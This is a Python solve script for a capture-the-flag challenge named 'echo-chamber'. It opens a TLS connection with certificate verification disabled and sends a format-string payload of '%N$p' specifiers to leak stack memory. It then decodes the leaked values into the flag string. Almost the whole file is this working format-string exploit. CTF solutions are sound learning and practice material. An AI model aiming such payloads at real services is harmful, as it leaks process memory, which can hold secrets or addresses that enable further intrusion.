import socket
import ssl
import struct

def solve():
    host = 'echo-chamber-74c8a31a9e9c.chall.nnsc.tf'
    port = 1337

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print("Connected!")
            
            # Read prompt "> "
            ssock.recv(1024)
            
            # We found the flag at offsets 22 to 30 roughly. Let's just grab 20 to 35.
            payload = ".".join([f"%{i}$p" for i in range(20, 35)]) + "\n"
            ssock.sendall(payload.encode())
            
            response = ssock.recv(4096).decode(errors='replace')
            print("Response:", response)
            
            flag = ""
            for p in response.split('.'):
                if p.startswith('0x'):
                    try:
                        val = int(p, 16)
                        if val != 0:
                            # Pack into 8 bytes little endian
                            decoded = struct.pack('<Q', val)
                            flag += decoded.decode(errors='ignore').replace('\x00', '')
                    except:
                        pass
            print("Extracted:", flag)

if __name__ == "__main__":
    solve()
